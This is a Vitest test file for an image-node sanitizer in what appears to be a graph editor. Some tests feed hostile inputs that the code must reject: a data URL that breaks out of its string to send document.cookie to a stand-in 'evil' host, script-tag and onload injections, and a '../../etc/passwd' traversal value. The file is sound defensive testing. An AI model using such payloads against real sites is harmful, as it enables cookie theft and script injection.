import { describe, it, expect, vi } from 'vitest';
import {
  decodeImageNode,
  displayImageFileName,
  validImageDataUrl,
  makeImageNodeData,
  resolveImageDrop,
  totalImageChars,
  sanitizeImageNodes,
  MAX_IMAGE_ENCODED_CHARS,
  HARD_MAX_IMAGE_ENCODED_CHARS,
  MAX_TOTAL_IMAGE_CHARS,
} from './imageNode';
import { makeNode } from '../test-utils';

/** A tiny valid payload: 3 bytes → 4 base64 chars. */
const B64 = btoa('abc'); // "YWJj"
const URL_PNG = `data:image/png;base64,${B64}`;

function values(overrides: Record<string, string | number> = {}) {
  return { imageB64: URL_PNG, width: 2, height: 2, fileName: 'x.png', colorSpace: 'color', ...overrides };
}

describe('decodeImageNode', () => {
  it('decodes a valid png/jpeg/webp payload', () => {
    for (const mime of ['png', 'jpeg', 'webp'] as const) {
      const d = decodeImageNode(values({ imageB64: `data:image/${mime};base64,${B64}` }));
      expect(d).not.toBeNull();
      expect(d!.mime).toBe(mime);
      expect(Array.from(d!.bytes)).toEqual([97, 98, 99]);
      expect(d!.width).toBe(2);
      expect(d!.height).toBe(2);
    }
  });

  it('rejects missing / empty / non-string payloads', () => {
    expect(decodeImageNode(values({ imageB64: '' }))).toBeNull();
    expect(decodeImageNode({ width: 2, height: 2 })).toBeNull();
    expect(decodeImageNode(values({ imageB64: 42 as unknown as string }))).toBeNull();
  });

  it('rejects non-data URLs (remote-beacon vector)', () => {
    expect(decodeImageNode(values({ imageB64: 'https://evil.example/pixel.png' }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: 'javascript:alert(1)' }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: `data:image/svg+xml;base64,${B64}` }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: `data:image/gif;base64,${B64}` }))).toBeNull();
  });

  it('rejects string-literal breakout payloads', () => {
    const attacks = [
      `data:image/png;base64,AA";fetch('https://evil/'+document.cookie);//`,
      `data:image/png;base64,AA\\`,
      `data:image/png;base64,AA\`\${fetch('x')}\``,
      `data:image/png;base64,AA\n`, // JS $ must not match before a trailing newline
      `data:image/png;base64,AA</script><script>alert(1)</script>`,
      `data:image/png;base64,AA fetch('x')`,
    ];
    for (const a of attacks) expect(decodeImageNode(values({ imageB64: a }))).toBeNull();
  });

  it('rejects regex-valid but atob-invalid base64 (the "A=A=" trap)', () => {
    expect(decodeImageNode(values({ imageB64: 'data:image/png;base64,A=A=' }))).toBeNull();
    expect(decodeImageNode(values({ imageB64: 'data:image/png;base64,A' }))).toBeNull();
  });

  it('rejects payloads over the hard ceiling', () => {
    const huge = `data:image/png;base64,${'A'.repeat(HARD_MAX_IMAGE_ENCODED_CHARS)}`;
    expect(decodeImageNode(values({ imageB64: huge }))).toBeNull();
  });

  it('rejects malformed width/height', () => {
    expect(decodeImageNode(values({ width: 0 }))).toBeNull();
    expect(decodeImageNode(values({ width: -4 }))).toBeNull();
    expect(decodeImageNode(values({ width: 1.5 }))).toBeNull();
    expect(decodeImageNode(values({ width: 'lol' }))).toBeNull();
    expect(decodeImageNode(values({ height: 999999 }))).toBeNull();
  });
});

describe('validImageDataUrl', () => {
  it('passes only whitelisted data URLs through', () => {
    expect(validImageDataUrl(URL_PNG)).toBe(URL_PNG);
    expect(validImageDataUrl('https://evil.example/a.png')).toBeNull();
    expect(validImageDataUrl('')).toBeNull();
    expect(validImageDataUrl(undefined)).toBeNull();
    expect(validImageDataUrl(`data:image/png;base64,AA"onload="alert(1)`)).toBeNull();
  });
});

describe('makeImageNodeData', () => {
  it('builds the imageNode payload shape', () => {
    const d = makeImageNodeData(URL_PNG, 64, 32, 2, 'cat.png');
    expect(d.registryType).toBe('imageNode');
    expect(d.values.imageB64).toBe(URL_PNG);
    expect(d.values.width).toBe(64);
    expect(d.values.height).toBe(32);
    expect(d.values.fileName).toBe('cat.png');
    expect(d.values.colorSpace).toBe('color');
    expect(d.dynamicOutputs).toBeUndefined();
  });
});

describe('displayImageFileName', () => {
  // A dropped .png is routinely STORED as WebP or JPEG (the drop re-encodes),
  // so showing the source name on the card asserted a format the node didn't
  // hold — which is exactly how a converted image looked unconverted.
  it('takes the extension from the payload, not from the name', () => {
    expect(displayImageFileName('0004.png', 'data:image/jpeg;base64,AAAA')).toBe('0004.jpg');
    expect(displayImageFileName('photo.jpg', 'data:image/webp;base64,AAAA')).toBe('photo.webp');
    expect(displayImageFileName('tile.webp', URL_PNG)).toBe('tile.png');
  });

  it('keeps the stem intact, including dots inside it', () => {
    expect(displayImageFileName('my.normal.map.png', 'data:image/webp;base64,AAAA')).toBe('my.normal.map.webp');
    expect(displayImageFileName('no-extension', 'data:image/webp;base64,AAAA')).toBe('no-extension.webp');
  });

  it('falls back to the stored name when the payload is unusable', () => {
    // Never invent an extension for something that failed validation — the
    // node is showing the inert fallback in that state anyway.
    expect(displayImageFileName('0004.png', '')).toBe('0004.png');
    expect(displayImageFileName('0004.png', 'https://evil.example/x.png')).toBe('0004.png');
    expect(displayImageFileName('0004.png', undefined)).toBe('0004.png');
    expect(displayImageFileName(42, URL_PNG)).toBe('image.png');
  });
});

describe('resolveImageDrop', () => {
  const snapped = {
    dataUrl: `data:image/webp;base64,${'A'.repeat(40)}`,
    width: 2048,
    height: 1024,
    potApplied: true,
    original: { dataUrl: `data:image/webp;base64,${'B'.repeat(80)}`, width: 1920, height: 1080 },
  };

  it('places the snapped payload and records its provenance when the stash takes', () => {
    const r = resolveImageDrop(snapped, 'cat.png', () => 'abc123');
    expect(r.payload.width).toBe(2048);
    expect(r.origin).toEqual({ originId: 'abc123', srcWidth: 1920, srcHeight: 1080 });
  });

  // THE load-bearing rule of the power-of-two feature: a destructive resample
  // only ships together with the way back. The snap happens inside the encode,
  // before the stash is attempted, so a refused stash has to be handled HERE —
  // the ignore-limits override raises the encode budget above what the cache
  // accepts, which is exactly when this fires.
  it('DISCARDS the snap when the stash is refused', () => {
    const r = resolveImageDrop(snapped, 'cat.png', () => null);
    expect(r.payload).toEqual(snapped.original);
    expect(r.origin).toBeUndefined();
  });

  it('never claims a snap that did not happen', () => {
    const plain = { dataUrl: snapped.dataUrl, width: 512, height: 512, potApplied: false };
    const stash = vi.fn(() => 'unused');
    const r = resolveImageDrop(plain, 'cat.png', stash);
    expect(r.payload).toBe(plain);
    expect(r.origin).toBeUndefined();
    expect(stash).not.toHaveBeenCalled();
  });

  it('passes the file name through to the stash for the Original row', () => {
    const stash = vi.fn(() => 'abc123');
    resolveImageDrop(snapped, 'cat.png', stash);
    expect(stash).toHaveBeenCalledWith({ ...snapped.original, fileName: 'cat.png' });
  });
});

describe('totalImageChars / sanitizeImageNodes', () => {
  const img = (id: string, url: string) =>
    makeNode(id, 'imageNode', { imageB64: url, width: 2, height: 2 });

  it('sums payload chars across image node instances only', () => {
    const nodes = [img('a', URL_PNG), img('b', URL_PNG), makeNode('c', 'float', { value: 1 })];
    expect(totalImageChars(nodes)).toBe(URL_PNG.length * 2);
  });

  it('always strips hard violations, even with soft limits off', () => {
    const nodes = [img('a', 'https://evil.example/x.png'), img('b', URL_PNG)];
    const r = sanitizeImageNodes(nodes, false);
    expect(r.strippedCount).toBe(1);
    expect((r.nodes[0].data as { values: Record<string, unknown> }).values.imageB64).toBe('');
    expect((r.nodes[1].data as { values: Record<string, unknown> }).values.imageB64).toBe(URL_PNG);
  });

  it('enforces the per-image soft cap when asked', () => {
    const overSoft = `data:image/png;base64,${'A'.repeat(MAX_IMAGE_ENCODED_CHARS + 4)}`;
    expect(sanitizeImageNodes([img('a', overSoft)], true).strippedCount).toBe(1);
    expect(sanitizeImageNodes([img('a', overSoft)], false).strippedCount).toBe(0);
  });

  it('enforces the running total cap', () => {
    // Each payload sits under the per-image cap; six together cross the total.
    const chunk = `data:image/png;base64,${'A'.repeat(MAX_IMAGE_ENCODED_CHARS - 1_000)}`;
    const nodes = Array.from({ length: 6 }, (_, i) => img(`n${i}`, chunk));
    const r = sanitizeImageNodes(nodes, true);
    expect(r.strippedCount).toBe(6 - Math.floor(MAX_TOTAL_IMAGE_CHARS / chunk.length));
    expect(r.strippedCount).toBeGreaterThan(0);
    expect(sanitizeImageNodes(nodes, false).strippedCount).toBe(0);
  });

  it('returns the original array untouched when nothing is stripped', () => {
    const nodes = [img('a', URL_PNG)];
    expect(sanitizeImageNodes(nodes, true).nodes).toBe(nodes);
  });

  // Provenance keys (written by the drop-time power-of-two snap) arrive from
  // imported project JSON like everything else. `originId` is used as an
  // IndexedDB key and the src dims feed a CSS aspect-ratio, so both are
  // whitelisted here rather than at every read site.
  describe('provenance keys', () => {
    const withOrigin = (extra: Record<string, string | number>) =>
      makeNode('a', 'imageNode', { imageB64: URL_PNG, width: 2, height: 2, ...extra });
    const valuesOf = (r: { nodes: unknown[] }) =>
      (r.nodes[0] as { data: { values: Record<string, unknown> } }).data.values;

    it('keeps a well-formed originId + src dimension pair', () => {
      const nodes = [withOrigin({ originId: 'abcdef0123456789', srcWidth: 1920, srcHeight: 1080 })];
      const r = sanitizeImageNodes(nodes, true);
      expect(r.strippedCount).toBe(0);
      expect(r.nodes).toBe(nodes); // untouched → same identity
    });

    it('drops a malformed originId but keeps the image working', () => {
      const r = sanitizeImageNodes([withOrigin({ originId: '../../etc/passwd' })], true);
      expect(r.strippedCount).toBe(0);
      expect(valuesOf(r).originId).toBeUndefined();
      expect(valuesOf(r).imageB64).toBe(URL_PNG);
    });

    it('drops out-of-range source dimensions', () => {
      expect(valuesOf(sanitizeImageNodes([withOrigin({ srcWidth: 99999, srcHeight: 1080 })], true)).srcWidth)
        .toBeUndefined();
      expect(valuesOf(sanitizeImageNodes([withOrigin({ srcWidth: 0, srcHeight: 0 })], true)).srcHeight)
        .toBeUndefined();
    });

    it('drops a half pair — an aspect ratio needs both', () => {
      const v = valuesOf(sanitizeImageNodes([withOrigin({ srcWidth: 1920 })], true));
      expect(v.srcWidth).toBeUndefined();
      expect(v.srcHeight).toBeUndefined();
    });

    it('still strips a hostile payload on a node carrying provenance', () => {
      const r = sanitizeImageNodes(
        [makeNode('a', 'imageNode', { imageB64: 'https://evil.example/x.png', width: 2, height: 2, originId: 'zz' })],
        true,
      );
      expect(r.strippedCount).toBe(1);
      expect(valuesOf(r).imageB64).toBe('');
      expect(valuesOf(r).originId).toBeUndefined();
    });
  });
});
